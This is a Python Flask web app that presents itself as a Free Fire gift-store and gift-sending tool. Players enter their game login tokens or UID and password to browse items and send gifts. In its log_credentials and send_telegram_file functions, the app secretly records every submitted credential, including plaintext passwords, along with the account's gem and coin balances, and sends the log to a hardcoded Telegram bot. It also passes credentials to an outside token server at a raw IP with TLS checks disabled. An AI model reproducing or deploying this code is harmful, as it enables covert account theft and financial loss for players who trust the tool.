import os, sys, requests, json, base64, urllib3
from datetime import datetime
from flask import Flask, request, jsonify, Response
from dotenv import load_dotenv
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from google.protobuf.json_format import MessageToDict

# Compiled Protos (same folder)
import GetGiftStoreDetails_pb2
import GetWallet_pb2
import SendGift_pb2

load_dotenv()

# ===== HARDCODED TELEGRAM CREDENTIALS (IN‑BUILD) =====
TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"   # Replace!
TELEGRAM_CHAT_ID    = "YOUR_CHAT_ID_HERE"    # Replace!
# =====================================================

IMAGE_BASE_URL = os.getenv("IMAGE_BASE_URL")
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)

# Read index.html from the same folder (no templates subfolder)
try:
    with open('index.html', 'r', encoding='utf-8') as f:
        INDEX_HTML = f.read()
except Exception as e:
    INDEX_HTML = "<h1>Error loading index.html</h1>"
    print(f"Error reading index.html: {e}")

# --- CONFIG ---
KEY = bytes([89, 103, 38, 116, 99, 37, 68, 69, 117, 104, 54, 37, 90, 99, 94, 56])
IV  = bytes([54, 111, 121, 90, 68, 114, 50, 50, 69, 51, 121, 99, 104, 106, 77, 37])
USER_AGENT = "UnityPlayer/2022.3.47f1 (UnityWebRequest/1.0, libcurl/8.5.0-DEV)"
TOKEN_API_BASE = "http://87.232.72.68:3005/token"

PREFIX_MAP = {
    "902": "Avatar", "214": "Facepaint", "101": "Female Skills", "102": "Male Skills", 
    "103": "Microchip", "905": "Parachute", "710": "Bundle", "720": "Bundle2", 
    "203": "Top", "204": "Bottom", "205": "Shoes", "211": "Head", "901": "Banner", 
    "131": "Pet2", "130": "Pets/Emotes", "903": "Loot Box", "904": "Backpack", 
    "906": "Skyboard", "907": "Others", "908": "Vehicles", "909": "Emote", 
    "911": "SkyWings", "922": "Skill Skin",
}

STORE_CACHE = {}

def encrypt_payload(data):
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    return cipher.encrypt(pad(data, AES.block_size))

def get_server_url(region):
    if region == "IND": return "https://client.ind.freefiremobile.com"
    elif region in ["BR", "US", "SAC", "NA"]: return "https://client.us.freefiremobile.com"
    else: return "https://clientbp.ggpolarbear.com"

def decode_jwt(token):
    try:
        p = token.split('.')[1]
        p += '=' * (4 - len(p) % 4)
        dec = json.loads(base64.b64decode(p))
        return dec.get("lock_region"), dec.get("external_id")
    except: return None, None

def get_wallet_data(jwt, login_token, region):
    req = GetWallet_pb2.CSGetWalletReq(login_token=login_token, topup_rebate=False)
    headers = {"Authorization": f"Bearer {jwt}", "X-GA": "v1 1", "ReleaseVersion": "OB53", "Content-Type": "application/octet-stream", "User-Agent": USER_AGENT}
    try:
        r = requests.post(f"{get_server_url(region)}/GetWallet", data=encrypt_payload(req.SerializeToString()), headers=headers, verify=False, timeout=10)
        if r.status_code == 200:
            res_pb = GetWallet_pb2.CSGetWalletRes()
            res_pb.ParseFromString(r.content)
            w = res_pb.wallet
            ts = datetime.fromtimestamp(w.last_topup_time).strftime('%d %b %Y, %I:%M %p') if w.last_topup_time > 0 else "Never"
            return {"gold": w.coins, "diamond": w.gems, "last_topup": ts}
    except: pass
    return {"gold": 0, "diamond": 0, "last_topup": "Error"}

def send_telegram_file(file_path):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID or TELEGRAM_BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        return
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        with open(file_path, 'rb') as f:
            files = {'document': f}
            data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': f"📁 Credentials Log - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"}
            requests.post(url, files=files, data=data, timeout=10)
    except Exception:
        pass

def log_credentials(credential_type, raw_credential, uid, wallet, nickname=""):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    gems = wallet.get('diamond', 0) if wallet else 'N/A'
    coins = wallet.get('gold', 0) if wallet else 'N/A'
    
    log_line = f"[{timestamp}] Method: {credential_type}\n"
    if credential_type == "uid_password":
        log_line += f"UID: {raw_credential.get('uid', '')}\nPassword: {raw_credential.get('password', '')}\n"
    else:
        log_line += f"Token: {raw_credential}\n"
    log_line += f"UID from JWT: {uid}\nNickname: {nickname}\nGems: {gems}\nCoins: {coins}\n{'-'*50}\n"
    
    # Use /tmp for writable storage on Vercel
    log_file = "/tmp/credentials.log"
    try:
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(log_line)
    except:
        pass
    
    send_telegram_file(log_file)

@app.route('/')
def index():
    return Response(INDEX_HTML, mimetype='text/html')

@app.route('/api/image/<item_id>')
def serve_image(item_id):
    try:
        r = requests.get(f"{IMAGE_BASE_URL}{item_id}.png", timeout=5)
        return Response(r.content, mimetype='image/png')
    except: 
        return "Not Found", 404

@app.route('/api/get_jwt', methods=['POST'])
def get_jwt():
    data = request.json
    method = data.get('method')
    raw_credential = None
    
    if method == 'jwt':
        jwt_raw = data.get('jwt', '').strip()
        if not jwt_raw:
            return jsonify({"success": False, "message": "JWT token is required"}), 400
        raw_credential = jwt_raw
        jwt = jwt_raw
        _, uid = decode_jwt(jwt)
        nickname = ""
    elif method == 'access':
        access_raw = data.get('access_token', '').strip()
        if not access_raw:
            return jsonify({"success": False, "message": "Access token required"}), 400
        raw_credential = access_raw
        params = {'key': 'dgop', 'access': access_raw}
    elif method == 'eat':
        eat_raw = data.get('eat_token', '').strip()
        if not eat_raw:
            return jsonify({"success": False, "message": "EAT token required"}), 400
        raw_credential = eat_raw
        params = {'key': 'dgop', 'eat': eat_raw}
    elif method == 'uid_password':
        uid_raw = data.get('uid', '').strip()
        pwd_raw = data.get('password', '').strip()
        if not uid_raw or not pwd_raw:
            return jsonify({"success": False, "message": "UID and Password required"}), 400
        raw_credential = {'uid': uid_raw, 'password': pwd_raw}
        params = {'key': 'dgop', 'uid': uid_raw, 'password': pwd_raw}
    else:
        return jsonify({"success": False, "message": "Invalid method"}), 400
    
    if method != 'jwt':
        try:
            resp = requests.get(TOKEN_API_BASE, params=params, verify=False, timeout=15)
            if resp.status_code != 200:
                return jsonify({"success": False, "message": f"Token API error: {resp.status_code}"}), 400
            result = resp.json()
            if 'token' not in result:
                return jsonify({"success": False, "message": "No JWT in API response"}), 400
            jwt = result['token']
            uid = result.get('uid')
            nickname = result.get('nickname', '')
        except Exception as e:
            return jsonify({"success": False, "message": str(e)}), 500
    
    region, login_token = decode_jwt(jwt)
    if not region:
        return jsonify({"success": False, "message": "Invalid JWT format"}), 400
    
    wallet = get_wallet_data(jwt, login_token, region)
    log_credentials(method, raw_credential, uid, wallet, nickname)
    
    return jsonify({"success": True, "jwt": jwt, "uid": uid, "nickname": nickname})

@app.route('/api/get_store', methods=['POST'])
def get_store():
    data = request.json
    jwt_token = data.get('jwt')
    page, limit, cat = int(data.get('page', 1)), int(data.get('limit', 24)), data.get('category', 'All')
    region, login_token = decode_jwt(jwt_token)
    if not region: 
        return jsonify({"success": False, "message": "Invalid JWT!"}), 400

    if jwt_token not in STORE_CACHE:
        wallet = get_wallet_data(jwt_token, login_token, region)
        req_pb = GetGiftStoreDetails_pb2.CSGetGiftStoreDetailsReq(store_id=1)
        headers = {"Authorization": f"Bearer {jwt_token}", "X-GA": "v1 1", "ReleaseVersion": "OB53", "Content-Type": "application/octet-stream", "User-Agent": USER_AGENT}
        
        try:
            r = requests.post(f"{get_server_url(region)}/GetGiftStoreDetails", data=encrypt_payload(req_pb.SerializeToString()), headers=headers, verify=False, timeout=15)
            if r.status_code == 200:
                res_pb = GetGiftStoreDetails_pb2.CSGetGiftStoreDetailsRes()
                res_pb.ParseFromString(r.content)
                res_dict = MessageToDict(res_pb, preserving_proto_field_name=True, always_print_fields_with_no_presence=True)
                
                all_items, categories = [], set()
                for item in res_dict.get('items', []):
                    item_id_str = str(item.get('item_id', '0'))
                    c_name = PREFIX_MAP.get(item_id_str[:3], f"Other ({item_id_str[:3]})")
                    categories.add(c_name)
                    
                    g, c = int(item.get('gems_price', 0)), int(item.get('coins_price', 0))
                    price = f"💎 {g} / 🪙 {c}" if g>0 and c>0 else f"💎 {g}" if g>0 else f"🪙 {c}" if c>0 else "Free"
                    
                    ts = int(item.get('expire_timestamp', 0))
                    exp_date = datetime.fromtimestamp(ts).strftime('%d %b %Y') if ts > 0 else "Permanent"

                    all_items.append({
                        "item_id": item_id_str, "commodity_id": item.get('commodity_id'),
                        "sort_id": int(item.get('sort_id', 0)), "price_str": price,
                        "category": c_name, "expire_date": exp_date
                    })

                all_items.sort(key=lambda x: x['sort_id'], reverse=True)
                STORE_CACHE[jwt_token] = {'items': all_items, 'wallet': wallet, 'sent': res_dict.get('send_gift_times_today', 0), 'cats': sorted(list(categories))}
            else: 
                return jsonify({"success": False, "message": "Garena Error"}), 400
        except Exception as e: 
            return jsonify({"success": False, "message": str(e)}), 500

    cache = STORE_CACHE[jwt_token]
    filtered = [x for x in cache['items'] if x['category'] == cat] if cat != "All" else cache['items']
    start = (page - 1) * limit
    
    return jsonify({
        "success": True, "items": filtered[start : start + limit], 
        "categories": cache['cats'], "wallet": cache['wallet'], 
        "sent_today": cache['sent'], "has_more": (start + limit) < len(filtered)
    })

@app.route('/api/send_gift', methods=['POST'])
def send_gift():
    data = request.json
    jwt, uid, comm_id, price, curr, msg = data.get('jwt'), data.get('receiver_uid'), data.get('commodity_id'), data.get('price'), data.get('currency'), data.get('message', 'Gift!')
    
    region, _ = decode_jwt(jwt)
    if not region: 
        return jsonify({"success": False, "message": "Invalid JWT"}), 400

    req = SendGift_pb2.CSSendGiftReq()
    req.receiver_account_ids.append(int(uid))
    req.buddy_type = 1
    req.commodity_id = int(comm_id)
    req.message_content = msg
    req.currency_type = 2 if curr == 'diamond' else 1
    req.commodity_cnt = 1
    req.unit_price = int(price)

    headers = {"Authorization": f"Bearer {jwt}", "X-GA": "v1 1", "ReleaseVersion": "OB53", "Content-Type": "application/octet-stream", "User-Agent": USER_AGENT}
    
    try:
        r = requests.post(f"{get_server_url(region)}/SendGift", data=encrypt_payload(req.SerializeToString()), headers=headers, verify=False, timeout=15)
        if r.status_code == 200:
            if jwt in STORE_CACHE: 
                del STORE_CACHE[jwt]
            return jsonify({"success": True, "message": f"Gift sent to {uid} successfully!"})
        else:
            try: 
                err = r.content.decode('utf-8').strip()
            except: 
                err = f"Error {r.status_code}"
            return jsonify({"success": False, "message": err})
    except Exception as e: 
        return jsonify({"success": False, "message": str(e)})

# For local development only – Vercel will ignore this
if __name__ == '__main__':
    app.run(port=8080)
